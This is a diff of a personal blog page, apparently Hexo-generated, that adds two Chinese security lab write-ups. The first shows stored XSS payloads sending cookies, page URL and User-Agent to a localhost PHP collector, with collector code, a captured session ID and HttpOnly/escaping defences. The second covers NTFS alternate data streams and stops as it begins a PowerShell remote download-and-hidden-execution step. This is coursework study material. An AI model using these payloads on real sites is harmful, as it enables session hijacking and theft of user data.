@@ -122,7 +122,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -177,6 +177,745 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="moyuan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyuan"s website">
+      <meta itemprop="description" content="prograing or coffee">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Moyuan"s website">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">XSS跨站攻击与Cookie验证欺骗实验</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-03 08:50:49 / 修改时间：08:51:10" itemprop="dateCreated datePublished" datetime="2024-12-03T08:50:49+08:00">2024-12-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="XSS跨站攻击与Cookie验证欺骗实验"><a href="#XSS跨站攻击与Cookie验证欺骗实验" class="headerlink" title="XSS跨站攻击与Cookie验证欺骗实验"></a>XSS跨站攻击与Cookie验证欺骗实验</h3><h4 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h4><ol>
+<li>研究并实践XSS攻击的原理与实现方式。</li>
+<li>实现通过XSS攻击获取网页地址、User-Agent及Cookie的方法。</li>
+<li>提交实验代码与报告，验证攻击与防护效果。</li>
+</ol>
+<hr>
+<h4 id="二、XSS跨站攻击实现细节"><a href="#二、XSS跨站攻击实现细节" class="headerlink" title="二、XSS跨站攻击实现细节"></a>二、XSS跨站攻击实现细节</h4><h5 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a>1. 基本原理</h5><p>XSS是一种通过注入恶意代码在用户浏览器中执行非授权操作的攻击方式。主要分为：</p>
+<ul>
+<li><strong>持久型XSS</strong>：恶意代码存储在服务器，能长期触发。</li>
+<li><strong>非持久型XSS</strong>：恶意代码不存储，依赖特定URL。</li>
+</ul>
+<h5 id="2-利用XSS攻击Cookie验证"><a href="#2-利用XSS攻击Cookie验证" class="headerlink" title="2. 利用XSS攻击Cookie验证"></a>2. 利用XSS攻击Cookie验证</h5><p>通过XSS脚本，将目标用户的Cookie发送至攻击者控制的服务器，绕过正常验证实现欺骗。</p>
+<p><strong>代码示例：</strong><br>在留言表单中插入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location=&#x27;http://localhost/getsession/savesession.php?cookie=&#x27;+escape(document.cookie);&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>当管理员点击链接时，<code>document.cookie</code>中的SessionID被发送到<code>http://localhost/getsession/savesession.php</code>。</p>
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144733663.png" class="" title="image-20241129144733663">
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144743544.png" class="" title="image-20241129144743544">
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144751976.png" class="" title="image-20241129144751976">
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144812283.png" class="" title="image-20241129144812283">
+</li>
+</ul>
+<hr>
+<h4 id="三、实现网页地址、User-Agent和Cookie获取"><a href="#三、实现网页地址、User-Agent和Cookie获取" class="headerlink" title="三、实现网页地址、User-Agent和Cookie获取"></a>三、实现网页地址、User-Agent和Cookie获取</h4><h5 id="1-攻击代码"><a href="#1-攻击代码" class="headerlink" title="1. 攻击代码"></a>1. 攻击代码</h5><p>在留言页面注入如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location=&#x27;http://localhost/getsession/savelog.php?cookie=&#x27; + encodeURIComponent(document.cookie) + &#x27;&amp;url=&#x27; + encodeURIComponent(document.location.href) + &#x27;&amp;userAgent=&#x27; + encodeURIComponent(navigator.userAgent);&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="2-数据记录服务端代码"><a href="#2-数据记录服务端代码" class="headerlink" title="2. 数据记录服务端代码"></a>2. 数据记录服务端代码</h5><p>创建一个<code>savelog.php</code>文件，记录获取的数据：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;con_database.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获前端传递的参数</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>] : <span class="string">&quot;No Cookie&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] : <span class="string">&quot;No URL&quot;</span>;</span><br><span class="line"><span class="variable">$userAgent</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;userAgent&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;userAgent&#x27;</span>] : <span class="string">&quot;No User-Agent&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试输出到日志文件</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;debug.log&quot;</span>, <span class="string">&quot;Cookie: <span class="subst">$cookie</span>\nURL: <span class="subst">$url</span>\nUser-Agent: <span class="subst">$userAgent</span>\n&quot;</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入到数据库</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cookie</span> &amp;&amp; <span class="variable">$url</span> &amp;&amp; <span class="variable">$userAgent</span>) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO logs (sessionid, url, userAgent) VALUES (?, ?, ?)&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>) &#123;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$cookie</span>, <span class="variable">$url</span>, <span class="variable">$userAgent</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Data logged successfully!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Execution failed: &quot;</span> . <span class="variable">$stmt</span>-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Statement preparation failed: &quot;</span> . <span class="variable">$con</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid data received. Cookie: <span class="subst">$cookie</span>, URL: <span class="subst">$url</span>, User-Agent: <span class="subst">$userAgent</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>showlog.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;con_database.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询日志数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT * FROM logs&#x27;</span>;</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查查询结果</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rs</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Query failed: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Cookie&lt;/th&gt;&lt;th&gt;URL&lt;/th&gt;&lt;th&gt;User-Agent&lt;/th&gt;&lt;/tr&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$rs</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;sessionid&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;url&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;userAgent&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rs</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_free_result</span>(<span class="variable">$rs</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> lab;</span><br><span class="line"></span><br><span class="line">USE lab;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建存储SessionID和其他信息的表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> logs (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    sessionid <span class="type">VARCHAR</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    url <span class="type">VARCHAR</span>(<span class="number">512</span>),</span><br><span class="line">    userAgent <span class="type">VARCHAR</span>(<span class="number">512</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129152020711.png" class="" title="image-20241129152020711">
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129212824325.png" class="" title="image-20241129212824325">
+<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129213527728.png" class="" title="image-20241129213527728">
+<hr>
+<h4 id="四、实验结果"><a href="#四、实验结果" class="headerlink" title="四、实验结果"></a>四、实验结果</h4><h5 id="1-攻击结果"><a href="#1-攻击结果" class="headerlink" title="1. 攻击结果"></a>1. 攻击结果</h5><ul>
+<li>成功窃取网页地址、User-Agent和Cookie，并在服务端<code>showlogs.php</code>中记录：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Session ID PHPSESSID=<span class="number">6</span>b5m2e67tdi26l28hjjcq093ff</span><br><span class="line">URL http<span class="punctuation">:</span><span class="comment">//localhost/xss/showmessage.php#</span></span><br><span class="line">User-Agent Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv<span class="punctuation">:</span><span class="number">133.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">133.0</span></span><br></pre></td></tr></table></figure>
+<h5 id="2-验证Cookie欺骗"><a href="#2-验证Cookie欺骗" class="headerlink" title="2. 验证Cookie欺骗"></a>2. 验证Cookie欺骗</h5><p>将SessionID设置为被窃取的值，访问目标页面，成功伪装为受害者。</p>
+<h5 id="3-防护措施"><a href="#3-防护措施" class="headerlink" title="3. 防护措施"></a>3. 防护措施</h5><ul>
+<li><p><strong>设置HttpOnly</strong>：禁止通过JavaScript读取Cookie：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="title function_ invoke__">session_id</span>(), <span class="number">0</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>HTML转义</strong>：在输出前转义用户输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$userInput</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><ol>
+<li><strong>攻击实现</strong>：<ul>
+<li>XSS攻击能够轻松窃取用户信息并实现会话劫持。</li>
+<li>利用脚本，获取地址、User-Agent和Cookie等敏感信息。</li>
+</ul>
+</li>
+<li><strong>防护措施</strong>：<ul>
+<li>使用HttpOnly属性保护Cookie。</li>
+<li>对用户输入进行严格的HTML和JavaScript转义。</li>
+</ul>
+</li>
+<li><strong>建议</strong>：<ul>
+<li>定期对网站进行漏洞扫描，防范潜在的XSS攻击。</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="moyuan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyuan"s website">
+      <meta itemprop="description" content="prograing or coffee">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Moyuan"s website">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/" class="post-title-link" itemprop="url">无文件病毒的定义及实践</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-03 08:48:51 / 修改时间：08:49:36" itemprop="dateCreated datePublished" datetime="2024-12-03T08:48:51+08:00">2024-12-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="无文件病毒的定义及实践"><a href="#无文件病毒的定义及实践" class="headerlink" title="无文件病毒的定义及实践"></a>无文件病毒的定义及实践</h3><hr>
+<h4 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h4><ol>
+<li>理解无文件病毒的定义及其主要类型。</li>
+<li>学习并实践利用NTFS数据流文件创建ADS数据流文件。</li>
+<li>使用PowerShell实现远程下载与隐匿执行脚本。</li>
+</ol>
+<hr>
+<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul>
+<li>操作系统：Windows 10 (支持NTFS文件系统)</li>
+<li>工具：<ul>
+<li><strong>命令提示符</strong> (cmd)</li>
+<li><strong>PowerShell</strong></li>
+<li><strong>记事本</strong> (Notepad)</li>
+<li><strong>WinHex</strong>（用于查看和删除ADS数据流文件）</li>
+<li><strong>网络服务器</strong> (用于托管远程脚本)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><h5 id="1-无文件病毒的定义及类型"><a href="#1-无文件病毒的定义及类型" class="headerlink" title="1. 无文件病毒的定义及类型"></a>1. 无文件病毒的定义及类型</h5><p><strong>无文件病毒定义</strong><br>无文件病毒是指不依赖传统文件形式的恶意代码。它利用内存、注册表、合法系统工具（如PowerShell、CMD、NTFS ADS等）执行其功能，从而规避文件扫描型安全软件。</p>
+<p><strong>主要类型</strong>：</p>
+<ul>
+<li><strong>灰色工具型</strong>：使用合法系统工具或组件如PowerShell、注册表、NTFS ADS。</li>
+<li><strong>脚本型</strong>：使用脚本语言（如VBScript、JavaScript）进行隐匿攻击。</li>
+<li><strong>潜伏型</strong>：将恶意代码隐匿在注册表、WMI或系统库文件中以长期驻留。</li>
+<li><strong>内存型</strong>：病毒仅存在于内存中，无磁盘落地，执行后即从内存中移除。</li>
+</ul>
+<hr>
+<h5 id="2-NTFS-ADS数据流文件创建及使用"><a href="#2-NTFS-ADS数据流文件创建及使用" class="headerlink" title="2. NTFS ADS数据流文件创建及使用"></a>2. NTFS ADS数据流文件创建及使用</h5><p><strong>实验步骤</strong>  </p>
+<ol>
+<li><p><strong>创建附加于宿主文件的ADS数据流文件</strong>：</p>
+<ul>
+<li><p>使用以下命令创建一个宿主文件：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;Hello World&quot; &gt; primary.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>向宿主文件添加ADS数据流文件：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;ADS Content&quot; &gt; primary.txt:ads.txt</span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125193817474.png" class="" title="image-20241125193817474">
+</li>
+<li><p>使用以下命令查看ADS数据流文件：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /r</span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125193831625.png" class="" title="image-20241125193831625">
+</li>
+<li><p>打开ADS数据流文件：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad primary.txt:ads.txt</span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125193906448.png" class="" title="image-20241125193906448">
+</li>
+</ul>
+</li>
+<li><p><strong>创建独立的ADS数据流文件</strong>：</p>
+<ul>
+<li><p>创建一个独立的ADS数据流文件：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;Independent ADS Content&quot; &gt; :independent.txt</span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125194002880.png" class="" title="image-20241125194002880">
+</li>
+<li><p>退至上一级目录，使用 <code>cd ..</code></p>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125194020283.png" class="" title="image-20241125194020283">
+</li>
+<li><p>查看文件内容：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad test:independent.txt</span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125195421008.png" class="" title="image-20241125195421008">
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125195437126.png" class="" title="image-20241125195437126">
+</li>
+<li><p>若无法删除：</p>
+<ul>
+<li><p>使用WinHex工具定位并删除该ADS数据流文件。(“工具→打开磁盘→选择磁盘”) 没有目录的点（“查看→显示→目录浏览器”）</p>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125231915354.png" class="" title="image-20241125231915354">
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125232418586.png" class="" title="image-20241125232418586">
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h5 id="3-使用PowerShell远程下载并隐匿执行脚本"><a href="#3-使用PowerShell远程下载并隐匿执行脚本" class="headerlink" title="3. 使用PowerShell远程下载并隐匿执行脚本"></a>3. 使用PowerShell远程下载并隐匿执行脚本</h5><p><strong>实验步骤</strong></p>
+<ol>
+<li><p><strong>创建PowerShell脚本（远程下载测试脚本）</strong>：</p>
+<ul>
+<li><p>在远程服务器托管一个脚本文件（<code>test.ps1</code>），内容如下：</p>
